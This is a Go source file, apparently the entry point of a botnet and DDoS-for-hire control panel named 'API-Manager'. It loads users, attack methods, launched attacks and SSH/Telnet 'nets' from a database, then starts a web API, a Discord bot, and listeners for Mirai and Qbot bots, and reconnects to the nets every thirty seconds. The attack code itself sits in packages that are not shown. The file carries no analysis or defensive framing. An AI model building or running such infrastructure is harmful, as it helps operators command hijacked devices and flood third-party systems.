package main

import (
	"Manager/Client"
	"Manager/api"
	"Manager/bot"
	"Manager/database"
	"Manager/raw"
	"fmt"
	"strconv"
	"time"
)

func main() {
	database.Info("Starting API-Manager")
	database.Connect()
	database.Info("Connected to Database")
	database.LoadConfig()
	database.Info("Loaded Config")
	database.ServerIP = database.GetServerIP()
	database.Info("Loaded Server IP: " + database.ServerIP)
	database.LoadUsers()
	database.Info("Loaded " + strconv.Itoa(len(database.Users)) + " users")
	database.LoadServers()
	database.Info("Loaded " + strconv.Itoa(len(database.Servers.Servers)) + " servers")
	database.LoadMethods()
	database.Info("Loaded " + strconv.Itoa(len(database.Methods.Methods)) + " methods")
	database.LoadAttacks()
	database.Info("Loaded " + strconv.Itoa(len(database.Attacks)) + " attacks")
	database.LoadNets()
	database.Info("Loaded " + strconv.Itoa(len(database.Nets.SSHs)+len(database.Nets.Telnets)) + " Nets")
	if database.Config.DiscordBot != "" {
		go bot.StartBot()
	}
	go api.StartWebserver()
	go raw.MiraiListener()
	go raw.QbotListener()
	go database.WatchFiles()
	database.Info("Webserver running on 0.0.0.0:" + fmt.Sprint(database.Config.Port))
	database.SendLog("Version: " + database.Version + "\r\nServers: " + strconv.Itoa(len(database.Servers.Servers)) + "\r\nMethods: " + strconv.Itoa(len(database.Methods.Methods)) + "\r\nUsers: " + strconv.Itoa(len(database.Users)))
	fmt.Println("Please Connect Nets!")
	database.ConnectNets()
	for {
		time.Sleep(30 * time.Second)
		database.CheckNets()
		database.ConnectNets()
	}
}
